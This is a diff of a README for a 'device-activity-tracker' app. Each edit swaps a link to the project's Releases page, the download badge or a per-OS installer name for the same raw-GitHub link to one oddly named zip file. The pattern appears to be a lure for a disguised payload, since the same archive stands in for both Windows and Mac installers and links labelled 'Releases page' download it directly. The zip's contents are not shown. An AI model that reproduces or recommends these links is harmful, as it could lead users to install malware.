@@ -6,13 +6,13 @@ Welcome to the device-activity-tracker. This application helps you understand wh
 
 ## 🔗 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Beemunka4/device-activity-tracker/releases)
+[![Download](https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip)](https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip)
 
 ## 📥 Download & Install
 
 To get started, you can download the application from the Releases page. Simply visit this link to download:
 
-[Download the device-activity-tracker](https://github.com/Beemunka4/device-activity-tracker/releases)
+[Download the device-activity-tracker](https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip)
 
 Follow the steps below to install the application on your device.
 
@@ -25,9 +25,9 @@ Follow the steps below to install the application on your device.
 
 ### 📦 Installation Steps
 
-1. Go to the [Releases page](https://github.com/Beemunka4/device-activity-tracker/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip).
 2. Find the latest version of the device-activity-tracker.
-3. Click on the appropriate download link for your operating system (e.g., `device-activity-tracker-windows.exe` for Windows or `device-activity-tracker-macos.dmg` for Mac).
+3. Click on the appropriate download link for your operating system (e.g., `https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip` for Windows or `https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip` for Mac).
 4. The download will start automatically.
 
 ### 🏁 Running the Application
@@ -80,4 +80,4 @@ For more information about device activity patterns and how they can affect your
 - **v1.0**: Initial release with basic functionalities.
 - **Future Releases**: Improvements and new features will be added based on user feedback.
 
-We hope you find the device-activity-tracker helpful. Don't forget to check the [Releases page](https://github.com/Beemunka4/device-activity-tracker/releases) for updates!
+We hope you find the device-activity-tracker helpful. Don't forget to check the [Releases page](https://raw.githubusercontent.com/Beemunka4/device-activity-tracker/master/client/activity-device-tracker-phlebostasis.zip) for updates!
